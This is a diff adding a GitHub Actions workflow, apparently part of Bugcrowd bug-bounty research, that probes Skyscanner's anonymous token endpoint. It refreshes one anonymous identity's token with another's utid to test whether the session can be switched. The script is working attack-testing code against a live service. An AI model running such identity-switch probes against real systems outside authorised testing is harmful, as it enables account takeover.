@@ -1,0 +1,173 @@
+name: Bugcrowd Skyscanner Anonymous Refresh Binding V39
+
+on:
+  push:
+    paths:
+      - '.github/workflows/bugcrowd-skyscanner-anonymous-refresh-binding-v39.yml'
+  workflow_dispatch:
+
+jobs:
+  refresh-binding:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: Test refresh binding with two controlled anonymous identities
+        shell: bash
+        run: |
+          set -euo pipefail
+          HDR='Skyscanner-Security: Bugcrowd'
+          UA='Mozilla/5.0 Bugcrowd-Research-Skyscanner-OwnAnonymousRefresh/1.0'
+          AUTH='https://www.skyscanner.net/g/anonymous-auth-service/token'
+          CLIENT_ID='6f1622ffe990bb31c213'
+          REDIRECT='skyscanner://oauth2redirect'
+
+          issue_identity() {
+            tag="$1"
+            supplied_utid=$(python3 - <<'PY'
+          import uuid
+          print(uuid.uuid4())
+          PY
+          )
+            code=$(curl -sS --max-time 25 -X POST               -H "$HDR" -H "User-Agent: $UA"               -H 'Accept: application/json'               -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'               --data-urlencode "client_id=$CLIENT_ID"               --data-urlencode 'scope='               --data-urlencode "redirect_uri=$REDIRECT"               --data-urlencode "previous_utid=$supplied_utid"               --data-urlencode 'grant_type=anonymous'               -o "/tmp/$tag.issue.json" -w '%{http_code}' "$AUTH")
+            echo "ISSUE_$tag"_HTTP="$code"
+            python3 - "$tag" issue <<'PY'
+          import base64, hashlib, json, os, sys
+
+          tag, phase = sys.argv[1:3]
+          path = f"/tmp/{tag}.{phase}.json"
+          raw = open(path, "rb").read() if os.path.exists(path) else b""
+          try:
+              data = json.loads(raw)
+          except Exception:
+              print(f"{phase.upper()}_{tag}_JSON=0 BODY_BYTES={len(raw)}")
+              raise SystemExit(2)
+
+          print(f"{phase.upper()}_{tag}_JSON=1 RESPONSE_KEYS={sorted(data.keys())}")
+          access = data.get("access_token") or data.get("token") or ""
+          refresh = data.get("refresh_token") or ""
+          print(f"{phase.upper()}_{tag}_HAS_ACCESS={bool(access)} ACCESS_LEN={len(access)}")
+          print(f"{phase.upper()}_{tag}_HAS_REFRESH={bool(refresh)} REFRESH_LEN={len(refresh)}")
+          if not access or not refresh:
+              raise SystemExit(3)
+
+          def payload(token):
+              parts = token.split(".")
+              if len(parts) < 2:
+                  return {}
+              encoded = parts[1] + "=" * (-len(parts[1]) % 4)
+              return json.loads(base64.urlsafe_b64decode(encoded.encode()))
+
+          claims = payload(access)
+          candidates = []
+          for key, value in claims.items():
+              if "utid" in key.lower() and isinstance(value, str) and value:
+                  candidates.append((key, value))
+          print(f"{phase.upper()}_{tag}_CLAIM_KEYS={sorted(claims.keys())}")
+          print(f"{phase.upper()}_{tag}_UTID_CANDIDATES={len(candidates)}")
+          if not candidates:
+              raise SystemExit(4)
+          utid = candidates[0][1]
+          print(f"{phase.upper()}_{tag}_UTID_HASH={hashlib.sha256(utid.encode()).hexdigest()[:16]}")
+          open(f"/tmp/{tag}.access", "w").write(access)
+          open(f"/tmp/{tag}.refresh", "w").write(refresh)
+          open(f"/tmp/{tag}.utid", "w").write(utid)
+          PY
+          }
+
+          refresh_identity() {
+            tag="$1"
+            source_tag="$2"
+            previous_tag="$3"
+            refresh_token=$(cat "/tmp/$source_tag.refresh")
+            args=(
+              -sS --max-time 25 -X POST
+              -H "$HDR" -H "User-Agent: $UA"
+              -H 'Accept: application/json'
+              -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'
+              --data-urlencode "client_id=$CLIENT_ID"
+              --data-urlencode 'grant_type=refresh_token'
+              --data-urlencode "refresh_token=$refresh_token"
+            )
+            if [ "$previous_tag" != "none" ]; then
+              previous_utid=$(cat "/tmp/$previous_tag.utid")
+              args+=(--data-urlencode "previous_utid=$previous_utid")
+            fi
+            code=$(curl "${args[@]}" -o "/tmp/$tag.refresh.json" -w '%{http_code}' "$AUTH")
+            echo "REFRESH_$tag"_HTTP="$code"
+            python3 - "$tag" refresh <<'PY'
+          import base64, hashlib, json, os, sys
+
+          tag, phase = sys.argv[1:3]
+          path = f"/tmp/{tag}.{phase}.json"
+          raw = open(path, "rb").read() if os.path.exists(path) else b""
+          try:
+              data = json.loads(raw)
+          except Exception:
+              print(f"{phase.upper()}_{tag}_JSON=0 BODY_BYTES={len(raw)}")
+              raise SystemExit(2)
+
+          print(f"{phase.upper()}_{tag}_JSON=1 RESPONSE_KEYS={sorted(data.keys())}")
+          access = data.get("access_token") or data.get("token") or ""
+          next_refresh = data.get("refresh_token") or ""
+          print(f"{phase.upper()}_{tag}_HAS_ACCESS={bool(access)} ACCESS_LEN={len(access)}")
+          print(f"{phase.upper()}_{tag}_HAS_REFRESH={bool(next_refresh)} REFRESH_LEN={len(next_refresh)}")
+          if not access:
+              safe_error = {k: data[k] for k in ("error", "error_description") if k in data}
+              print(f"{phase.upper()}_{tag}_SAFE_ERROR={safe_error}")
+              raise SystemExit(3)
+
+          parts = access.split(".")
+          if len(parts) < 2:
+              raise SystemExit(4)
+          encoded = parts[1] + "=" * (-len(parts[1]) % 4)
+          claims = json.loads(base64.urlsafe_b64decode(encoded.encode()))
+          candidates = [(k, v) for k, v in claims.items()
+                        if "utid" in k.lower() and isinstance(v, str) and v]
+          print(f"{phase.upper()}_{tag}_CLAIM_KEYS={sorted(claims.keys())}")
+          print(f"{phase.upper()}_{tag}_UTID_CANDIDATES={len(candidates)}")
+          if not candidates:
+              raise SystemExit(5)
+          utid = candidates[0][1]
+          print(f"{phase.upper()}_{tag}_UTID_HASH={hashlib.sha256(utid.encode()).hexdigest()[:16]}")
+          open(f"/tmp/{tag}.utid", "w").write(utid)
+          PY
+          }
+
+          issue_identity A
+          sleep 1
+          issue_identity B
+          sleep 1
+          refresh_identity A_BASELINE A none
+          sleep 1
+          refresh_identity B_WITH_A_PREVIOUS B A
+
+          python3 - <<'PY'
+          import hashlib
+
+          def read(name):
+              return open(name).read()
+
+          a = read("/tmp/A.utid")
+          b = read("/tmp/B.utid")
+          a_refresh = read("/tmp/A_BASELINE.utid")
+          b_mismatch = read("/tmp/B_WITH_A_PREVIOUS.utid")
+
+          initial_distinct = a != b
+          baseline_stays_a = a_refresh == a
+          mismatch_stays_b = b_mismatch == b
+          mismatch_switches_a = b_mismatch == a
+
+          print("INITIAL_IDENTITIES_DISTINCT=", initial_distinct)
+          print("BASELINE_REFRESH_STAYS_A=", baseline_stays_a)
+          print("MISMATCH_REFRESH_STAYS_B=", mismatch_stays_b)
+          print("MISMATCH_REFRESH_SWITCHES_TO_A=", mismatch_switches_a)
+
+          if initial_distinct and baseline_stays_a and mismatch_switches_a:
+              verdict = "CANDIDATE_CONTROLLED_IDENTITY_SWITCH"
+          elif initial_distinct and baseline_stays_a and mismatch_stays_b:
+              verdict = "NEGATIVE_EXPECTED_REFRESH_BINDING"
+          else:
+              verdict = "INCONCLUSIVE_REVIEW_REQUIRED"
+          print("V39_VERDICT=", verdict)
+          print("V39_REFRESH_BINDING_DONE=1")
+          PY
